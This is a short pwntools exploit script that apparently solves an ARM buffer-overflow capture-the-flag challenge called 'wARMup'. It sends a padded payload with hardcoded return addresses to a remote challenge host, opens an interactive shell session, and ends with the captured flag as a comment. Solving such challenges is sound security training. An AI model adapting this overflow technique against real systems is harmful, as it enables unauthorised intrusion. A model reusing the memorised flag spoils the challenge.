from pwn import *

#io = process(["qemu-arm-static", "-g", "10101" , "-L" , "/usr/arm-linux-gnueabihf/" , "./wARMup"])

io = remote('0.cloud.chals.io', 21744)
#io = process(["qemu-arm-static","-L" , "/usr/arm-linux-gnueabihf/" , "./wARMup"])

#io.sendline(b"YAAAAAAA" + p32(0xdeadbeef) + p32(0x00010618) + p32(0) + p32(0) + p32(0x21048) +p32(0x00010632))

io.sendline(b"Y" + b"AAAAAAA" + p32(0x00021048) + p32(0x000103e8) + p32(0x21048) + p32(0x10631))

io.interactive()

# uscg{sm4ll_sp4rk_c4n_st4rt_4_gr34t_f1r3}
